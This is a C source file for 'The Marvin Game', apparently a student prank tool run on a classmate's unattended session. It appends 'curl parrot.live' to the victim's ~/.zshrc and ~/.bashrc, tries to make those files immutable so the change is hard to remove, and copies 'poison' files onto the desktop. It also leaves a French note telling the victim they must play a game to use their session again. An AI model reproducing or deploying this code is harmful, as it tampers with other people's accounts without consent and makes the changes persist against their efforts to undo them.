/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   marvin_game.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/06/22 01:20:52 by mgama             #+#    #+#             */
/*   Updated: 2023/06/22 04:03:57 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/marvin_game.h"

int	print_consignes(t_data *data, char **envp)
{
	int		fd;
	char	*path;
	char	*t_cmd;
	char	**cmd;

	path = ft_strjoin(data->active_dir, "/consignes.mxga.txt");
	if (!path)
		return (1);
	fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0777);
	if (fd < 0)
		return (1);
	dprintf(fd, "----------The Marvin Game----------\n\n");
	dprintf(fd, "Bienvenue dans The Marvin Game ;)\n\n");
	dprintf(fd, "Ta session était sans surveillance, quel dommage !\n\n");
	dprintf(fd, "Pour pouvoir l'utiliser à nouveau tu vas devoir jouer à notre petit jeu. Une version de 'Où est Charlie', version 42.\n");
	dprintf(fd, "Comme tu as pu le constater il y a quelques nouveaux fichiers sur ton bureau, seul l'un d'eux est capable de t'aider.\n\n");
	dprintf(fd, "Il ne te reste plus qu'à chercher. Amuse-toi bien ;)\n");
	close(fd);
	printf("\033[36mCreating consignes.mxga.txt...\033[0m\n");
	t_cmd = ft_strjoin("open ", path);
	printf("created at %s\n", path);
	free(path);
	if (!t_cmd)
		return (1);
	cmd = ft_split(t_cmd, ' ');
	free(t_cmd);
	if (!cmd)
		return (1);
	process_child(cmd, envp);
	free_tab(cmd);
	return (0);
}

int	copy_alias(char **envp)
{
	int			i;
	int			fd;
	int			flags;
	char		*path;
	static char	*command = "curl parrot.live";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};

	(void)(envp);
	flags = 0;
	printf("\033[36mStart shell rc modifications...\033[0m\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		printf("opening and writing in %s\n", path);
		fd = open(path, O_CREAT | O_WRONLY | O_APPEND);
		if (fd < 0)
			return (free(path), 1);
		dprintf(fd, "%s\n", command);
		#if __APPLE__
		if (chflags(path, UF_IMMUTABLE) < 0)
			// return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
			if (setxattr(path, "security.evm", "immutable", sizeof("immutable"), 0, 0) < 0)
				return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
		#else
		// flags |= EXT2_IMMUTABLE_FL;
		// if (ioctl(fd, FS_IOC_SETFLAGS, &flags) < 0)
		// 	return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
			if (setxattr(path, "security.evm", "immutable", sizeof("immutable"), 0) < 0)
				return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
		#endif /* __APPLE__ */
		free(path);
		close(fd);
	}
	printf("--------------------\n");
	return (0);
}

int	copy_poison(t_data *data, char **envp)
{
	int		i;
	char	***cp_command;

	i = -1;
	printf("\033[36mStart poison and healer copy...\033[0m\n");
	cp_command = gen_poison_cmd(data);
	if (!cp_command)
		return (1);
	while (++i < data->file_count)
		process_child(cp_command[i], envp);
	waitpid(-1, NULL, 0);
	free_double_tab(cp_command);
	printf("--------------------\n");
	return (0);
}

int	setup_game(t_data *data, char **envp)
{
	#ifndef __APPLE__
	if (copy_alias(envp))
		return (dprintf(2, "Something went wrong :(\n"), 1);
	#else /* __APPLE__ */
	printf("Avoiding my local shell rc corruption :)\n");
	printf("--------------------\n");
	#endif
	if (copy_poison(data, envp))
		return (dprintf(2, "Something went wrong :(\n"), 1);
	print_consignes(data, envp);
	return (0);
}

int	main(int argc, char **argv, char **envp)
{
	t_data	data;
	int		t;
	DIR		*desktop_dir;
	#ifndef __APPLE__
	char	home_buffer[PATH_MAX];
	#endif /* __APPLE__ */

	srand(time(NULL));
	bzero(&data, sizeof(t_data));
	desktop_dir = NULL;
	if (!getcwd(data.current_dir, sizeof(data.current_dir)))
		return (dprintf(2, "Cannot get current dir\n"), 1);
	printf("--------------------Start Marvin Game--------------------\n");
	if (parse_args(argc, argv, &data))
		return (1);
	if (!data.active_dir)
	{
		#if __APPLE__
			data.active_dir = strdup("./tmp");
		#else
			data.active_dir = ft_strjoin(realpath(getenv("HOME"), home_buffer), "/Desktop");
		#endif /* __APPLE__ */
		printf("No active dir given, using default %s\n", data.active_dir);
	}
	if (!data.active_dir || !(desktop_dir = opendir(data.active_dir)))
		return (data.active_dir && (free(data.active_dir), 1), dprintf(2, "Cannot access active dir\n"), 1);
	free(desktop_dir);
	printf("\nParams:\nFile count = %d\nActive dir = %s\nCurrent dir = %s\n--------------------\n", data.file_count, data.active_dir, data.current_dir);
	t = setup_game(&data, envp);
	free(data.active_dir);
	printf("---------------------------------------------------------\n");
	return (t);
}
